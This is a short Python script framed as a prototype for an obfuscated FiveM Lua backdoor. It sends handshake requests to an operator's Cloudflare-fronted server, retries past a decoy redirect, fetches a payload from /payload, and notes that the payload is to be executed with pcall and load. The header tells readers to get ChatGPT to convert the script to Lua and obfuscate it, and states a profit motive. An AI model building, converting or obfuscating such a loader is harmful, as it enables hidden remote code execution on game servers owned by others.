"""
I do not know any lua so I made a simple python script on how it would work. 

To get the fivem lua go into chatgpt and ask it to convert it, after that make it obfuscate it using different methods









Get rich or die trying ig




"""
import requests
import random
import time


# IMPORTANT CHANGE THIS VARIABLE TO YOUR WEBSERVER
# Also use a domain with cloudflare.
url = "http://localhost/"


def get_crypto():


    dffsfsd = ["oki", "doki", "poki", "sloki", "choki", "doki", "pineapple", "xod", "123", "flfkm", "ubcwp", "ybolle", "phrase", "tsm", "uxawqzc"]
    f = random.randint(0, len(dffsfsd) - 1)
    b = random.randint(0, len(dffsfsd) - 1)
    payload = {
        
        dffsfsd[f]: dffsfsd[b] 
        }
    print(f)
    print(b)
    response = requests.post(url, data=payload)
    print(response.url)
    while response.url == "https://fini.ac/":
            f2 = random.randint(0, len(dffsfsd) - 1)
            b2 = random.randint(0, len(dffsfsd) - 1)
            print(response.url)
            payload = {
            
                
                dffsfsd[f2]: dffsfsd[b2] 
            }
            print(f2)
            print(b2)
            response = requests.post(url, data=payload)
            time.sleep(1);
    return response.text
def run_payload():
    payload = {
        "crypto": {crypto_value}
    }
    response = requests.post(f"{url}/payload", data=payload)
    print(response.url)
    return response.text
crypto_value = get_crypto()

if crypto_value:
        test = run_payload()
        print(test)
        # Run the payload using a pcall and a load
        